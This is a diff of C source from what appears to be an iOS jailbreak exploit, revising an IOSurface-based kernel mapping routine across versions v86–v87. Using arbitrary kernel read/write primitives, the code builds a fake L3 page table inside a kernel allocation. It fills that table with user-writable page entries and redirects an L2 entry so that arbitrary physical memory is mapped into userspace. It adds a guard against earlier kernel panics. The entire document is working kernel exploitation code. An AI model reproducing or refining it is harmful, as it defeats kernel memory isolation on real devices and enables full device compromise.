@@ -153,6 +153,29 @@ static uint64_t g_l2_orig   = 0;
 static int      g_l2_active = 0;
 extern void jb_tr_beacon(const char *fmt, ...);
 
+// v87: census carve-out map (fed by a18_probe after census-done). The
+// L2 table PA is checked against these BEFORE any primitive access —
+// v86 panicked because the pool's L2 table page sat in a hole on that
+// boot (kernel TTBR1 has no alias for hole pages).
+static struct { uint64_t lo, hi; } g_holes[16];
+static int g_hole_n = 0;
+void IOSurface_set_hole_run(uint64_t basePA, uint64_t pages)
+{
+	if (g_hole_n < 16) {
+		g_holes[g_hole_n].lo = basePA;
+		g_holes[g_hole_n].hi = basePA + pages * 0x4000ULL;
+		g_hole_n++;
+	}
+}
+static int pa_in_hole(uint64_t pa)
+{
+	for (int i = 0; i < g_hole_n; i++)
+		if (pa >= g_holes[i].lo && pa < g_holes[i].hi) return 1;
+	return 0;
+}
+
+uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak); // fwd: defined below
+
 struct IOSurface_toCleanup *cleanups = NULL;
 unsigned cleanupsCount = 0;
 
@@ -269,70 +292,73 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		*uaddr = NULL;
 		return -1;
 	}
-	uint64_t origL2e = kread64(l2 + 8 * idx2);
-	if (!(origL2e & 1)) {
-		jb_tr_beacon("KMAP fail,l2e,invalid=%llx", (unsigned long long)origL2e);
-		*uaddr = NULL;
-		return -1;
-	}
+	// (v87: origL2e is read AFTER the hole gate — never touch a holed L2)
 
-	// donor PA: v85 — the DESCRIPTOR's ranges field (desc+0x60) is the
-	// element pointer that's VALID every run (v75 pre,desc r60=valid VA;
-	// v84 proved surface+0x360 reads 0 on 18.2 — kept below as data only).
-	// vtophys on the element VA, then a 32B ALIAS read of the 16B element
-	// (aliases bypass zone bound checks — the element is unreachable only
-	// at its zone VA).
-	uint64_t elemVA = ranges;
-	uint64_t s360   = kread64(surface + 0x360); // observation only (v84: reads 0)
-	if (!elemVA) {
-		jb_tr_beacon("KMAP fail,elemva,s360=%llx", (unsigned long long)s360);
+	// v87: donor = IOSurface_kalloc_16up(0x4000) — a 16KB RANGES ARRAY we
+	// allocate via IOSurface itself. No packed-pointer decoding (v86: the
+	// element holds VM_PAGE_PACKED ptrs, base 0xffffffdc00000000 — not
+	// PAs), no element alias reads. kvtophys(arrVA) is the proven
+	// kernel-VA translator. Fake L3 = this array's page; the 4 window
+	// PTEs are written through its ALIAS (32B windows inside a 16KB
+	// object — RMW-law compliant).
+	uint64_t arrVA = IOSurface_kalloc_16up(0x4000, true);
+	if (!arrVA || arrVA == (uint64_t)-1) {
+		jb_tr_beacon("KMAP fail,kalloc16up");
 		*uaddr = NULL;
 		return -1;
 	}
-	uint64_t elemPA = kvtophys(elemVA);
-	if (!elemPA) {
-		// v86: elemVA is a KERNEL VA — vtophys (user walk) can never
-		// translate it (v85's fail,elemvtophys ×8). kvtophys is the
-		// kernel-VA translator used campaign-wide.
-		elemPA = vtophys(ttP, elemVA) & ~0x3FFFULL;
-		if (!elemPA) {
-			jb_tr_beacon("KMAP fail,elemPA,va=%llx", (unsigned long long)elemVA);
-			*uaddr = NULL;
-			return -1;
-		}
-	}
-	uint64_t elemOff   = elemVA & 0x3FFFULL;   // element's offset in its page
-	uint64_t elemAlias = phystokv(elemPA);
-	if (!elemAlias) {
-		jb_tr_beacon("KMAP fail,elemalias,pa=%llx", (unsigned long long)elemPA);
-		*uaddr = NULL;
-		return -1;
-	}
-	uint64_t rangesPair[2];
-	// v86: read at the element's PAGE OFFSET — v84/v85 read the alias page
-	// base, which would have been garbage even with a working translation.
-	kreadbuf(elemAlias + elemOff, rangesPair, sizeof(rangesPair));
-	uint64_t donorPA = rangesPair[0] & ~0x3FFFULL;
-	jb_tr_beacon("KMAP donor,elemva=%llx,elemalias=%llx,pa=%llx,size=%llx",
-	             (unsigned long long)elemVA, (unsigned long long)elemAlias,
-	             (unsigned long long)donorPA, (unsigned long long)rangesPair[1]);
+	uint64_t donorPA = kvtophys(arrVA) & ~0x3FFFULL;
+	jb_tr_beacon("KMAP donor,arrva=%llx,pa=%llx",
+	             (unsigned long long)arrVA, (unsigned long long)donorPA);
 	if (!donorPA) {
 		jb_tr_beacon("KMAP fail,donorpa");
 		*uaddr = NULL;
 		return -1;
 	}
 
-	// Build the fake L3 IN base0's first page from USERSPACE (base0 still
-	// maps the donor): zero all slots, then 4 PTEs for the 64KB window.
-	volatile uint64_t *fakeL3 = (volatile uint64_t *)base0;
-	uint64_t slot = (va >> 14) & 0x7FF;
-	for (int i = 0; i < 2048; i++) fakeL3[i] = 0;
-	uint64_t paPage = pa & ~0x3FFFULL;
-	for (int pgi = 0; pgi < 4; pgi++) {
-		fakeL3[slot + pgi] = 0x341ULL |
-			((((paPage + pgi * 0x4000ULL) >> 14) & 0x1FFFFFFFFULL) << 14);
+	// Build the fake L3 THROUGH THE ALIAS (the array is not user-mapped):
+	// zero the slot neighborhood, then 4 PTEs for the 64KB window.
+	uint64_t arrAlias = phystokv(kvtophys(arrVA));
+	if (!arrAlias) {
+		jb_tr_beacon("KMAP fail,arralias");
+		*uaddr = NULL;
+		return -1;
 	}
-	// PTE: Valid | AF(0x400) | SH_ISH(0x300) | AP_EL0RW(0x40), AttrIndx 0.
+	uint64_t arrOff = arrVA & 0x3FFFULL;
+	uint64_t slot   = (va >> 14) & 0x7FF;
+	uint64_t paPage = pa & ~0x3FFFULL;
+	if (arrOff + 8 * (slot + 4) > 0x4000 || slot + 4 > 2048) {
+		jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx,slot=%llx",
+		             (unsigned long long)arrOff, (unsigned long long)slot);
+		*uaddr = NULL;
+		return -1;
+	}
+	for (int pgi = 0; pgi < 4; pgi++) {
+		uint64_t pte = 0x341ULL |
+		    ((((paPage + pgi * 0x4000ULL) >> 14) & 0x1FFFFFFFFULL) << 14);
+		kwrite64(arrAlias + arrOff + 8 * (slot + pgi), pte);
+	}
+	jb_tr_beacon("KMAP fake3,alias=%llx,off=%llx,slot=%llx,pte0=%llx",
+	             (unsigned long long)arrAlias, (unsigned long long)arrOff,
+	             (unsigned long long)slot,
+	             (unsigned long long)kread64(arrAlias + arrOff + 8 * slot));
+
+	// Hole gate: the L2 table page must NOT be a census carve-out — v86
+	// panicked because the pool's L2 page was a hole on that boot (the RMW
+	// read of origL2e faulted kernel-side). Census runs are passed in from
+	// a18_probe (IOSurface_set_hole_map) after census-done.
+	uint64_t l2PA = kvtophys(l2);
+	if (pa_in_hole(l2PA)) {
+		jb_tr_beacon("KMAP skip,l2holed,pa=%llx", (unsigned long long)l2PA);
+		*uaddr = NULL;
+		return -1;
+	}
+	uint64_t origL2e = kread64(l2 + 8 * idx2);
+	if (!(origL2e & 1)) {
+		jb_tr_beacon("KMAP fail,l2e,invalid=%llx", (unsigned long long)origL2e);
+		*uaddr = NULL;
+		return -1;
+	}
 
 	// Redirect the L2 entry → donor page as L3 table (table desc 0x3).
 	uint64_t newL2e = (donorPA & 0x0000FFFFFFFFC000ULL) | 0x3;
